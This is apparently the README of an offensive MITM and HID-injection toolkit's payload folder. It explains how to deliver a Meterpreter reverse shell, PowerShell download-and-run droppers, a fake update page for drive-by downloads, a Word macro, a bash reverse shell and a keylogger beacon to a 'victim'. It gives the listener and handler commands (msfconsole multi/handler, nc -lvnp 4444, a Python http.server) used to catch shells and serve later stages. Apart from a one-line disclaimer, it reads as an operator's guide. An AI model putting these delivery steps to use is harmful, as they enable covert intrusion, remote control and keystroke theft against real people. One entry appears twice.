# JamFi Payloads – MITM Tips & Tricks

This folder contains real payloads delivered by JamFi’s MITM HID Injection module (Option 11). Each payload behaves differently and may require you to open a listener, run Metasploit, or serve follow-up files. Here’s what each payload does and how to use it:

- **`loot_dropper.py`** –  A Python script that grabs and runs another payload from your hosted server. Before delivery, run `sudo python3 -m http.server 4444` and place your follow-up script (e.g., `payload.py`) in that directory.

- **`payload.exe`** –  A real Windows Meterpreter reverse shell. Requires Metasploit to be running: `msfconsole`, then `use exploit/multi/handler`, set the correct payload (`windows/meterpreter/reverse_tcp`), set `LHOST` and `LPORT`, then `run`.

- **`payload.bat`** –  A Windows batch script that downloads and runs `payload.exe` via PowerShell. It works on almost any Windows system and launches instantly when clicked. Be sure `payload.exe` is being served at `http://10.0.0.1/payload.exe`.

- **`payload.hta`** –  A Windows HTML application that auto-executes a PowerShell payload when opened. Ideal for older Windows versions and Internet Explorer. Make sure your `payload.exe` is reachable at the link hardcoded in the file.

- **`reverse_shell.zip`** –  A zipped Bash reverse shell. When the victim extracts and runs it, it connects back to your terminal. You must run `sudo nc -lvnp 4444` before the victim opens it to catch the shell.

- **`autostart.html`** –  A fake update page that redirects to download `payload.exe` immediately when loaded. Simple, quick, and effective for drive-by-style delivery.

- **`macro.vba`** –  A Word macro script that executes a PowerShell command when a `.docm` file is opened. You don’t need to modify this — just understand that it must be embedded in a Word doc manually for full execution.

- **`keylogger_beacon.py`** –  A Python keylogger beacon that connects to your server. To use it, listen on the defined port or modify it to suit your lab. Best for staged post-exploitation or testing EDR evasion.

- **`reverse_shell.zip`** –  A zipped Bash reverse shell. When the victim extracts and runs it, it connects back to your terminal. You must run `sudo nc -lvnp 4444` before the victim opens it to catch the shell.

All payloads are delivered via `http://10.0.0.1` by JamFi’s MITM module when you choose Option 11 and a payload from the list. 
Logs from keystrokes and page visits are saved to `loot/keystroke_log_*.txt` and `loot/session_log_*.txt`. 
You do not need to change the IP — JamFi handles it. Just make sure you’re listening or serving the next stage where needed. 


DISCLAIMER: Only test in controlled environments you have permission to test on. user assumes all risk.
